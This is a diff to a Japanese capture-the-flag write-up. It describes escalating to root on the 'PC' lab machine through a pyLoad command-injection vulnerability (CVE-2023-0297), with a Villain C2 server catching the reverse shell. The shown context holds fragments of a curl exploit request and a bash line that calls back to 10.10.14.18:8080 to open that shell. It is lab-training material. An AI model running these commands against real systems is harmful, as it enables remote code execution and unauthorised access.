@@ -37,13 +37,16 @@ sauのアカウントでSSH接続することができました。<br>
 ![ps](https://github.com/sota70/PC-Easy-Writeup/assets/46929379/5722c2bf-e0d8-484d-8999-7a2e17c10bfa)
 8000番ポートはpyLoadのデフォルトポートなので、このサービスがrootで動いているか確かめてみます。<br>
 ![netstat](https://github.com/sota70/PC-Easy-Writeup/assets/46929379/58a16427-e087-4288-bdc1-27a853262f66kl)
-netstatで確認したところ、rootで動いているみたいです。<br>
+psで確認したところ、rootで動いているみたいです。<br>
 これは権限昇格に使えそうです。このサービス内で利用できそうな脆弱性を探してみると<br>
 command injectionの脆弱性が見つかりました(<https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad>)<br>
 <br>
 <br>
 ## 攻撃スクリプトの作成
 pyLoadの脆弱性を利用した攻撃では、reverse-shellを使います。今回は２つのスクリプトを作ります。<br>
+今回はC2サーバーとしてVillain(<https://github.com/t3l3machus/Villain>)を使っています。
+Villainは複数のreverse-shellセッションを保持しつつ、他のPCにあるVillainサーバーのセッションも共有できるので
+重宝してます。
 ### /tmp/exploit.sh
 ```
 curl -i -s -k -X $'POST' \
@@ -59,7 +62,6 @@ nohup bash -c 's=10.10.14.18:8080&&i=018583-c27fed-8677af&&hname=$(hostname)&&p=
 <br>
 1つ目のスクリプトはpyLoadに/tmp/exploit.shを実行させるスクリプトです。<br>
 ２つ目のスクリプトは自分のPCで動かしているC2サーバーにアクセスさせるスクリプトです。<br>
-今回はC2サーバーにVillain(<https://github.com/t3l3machus/Villain>)を使っています。<br>
 <br>
 <br>
 
